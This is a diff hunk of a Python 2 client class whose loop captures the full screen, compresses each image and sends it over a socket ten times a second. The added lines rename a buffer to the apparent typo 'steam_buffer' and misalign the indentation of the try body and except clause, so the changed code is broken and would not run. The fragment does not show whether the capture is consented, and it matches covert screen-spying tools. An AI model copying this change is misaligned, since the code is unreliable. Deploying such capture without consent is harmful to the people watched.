@@ -32,14 +32,14 @@ class client:
 		sock = self.create_socket()
 		while True:
 			try:
-				stream_buffer = io.BytesIO()
-				ImageGrab.grab().save(stream_buffer,'PNG')
-				screenshot = stream_buffer.getvalue()
-				#compress screenshot
-				screenshot = zlib.compress(screenshot)
-				sock.sendall(screenshot)
-				time.sleep(0.1)
-			except:
+				steam_buffer = io.BytesIO()
+			  ImageGrab.grab().save(steam_buffer,'PNG')
+			  screenshot = steam_buffer.getvalue()
+			  # Compress screenshot
+			  screenshot = zlib.compress(screenshot)
+			  sock.sendall(screenshot)
+			  time.sleep(0.1)
+			 except:
 				print "[!] Error starting client.... trying again"
 				time.sleep(2)
 
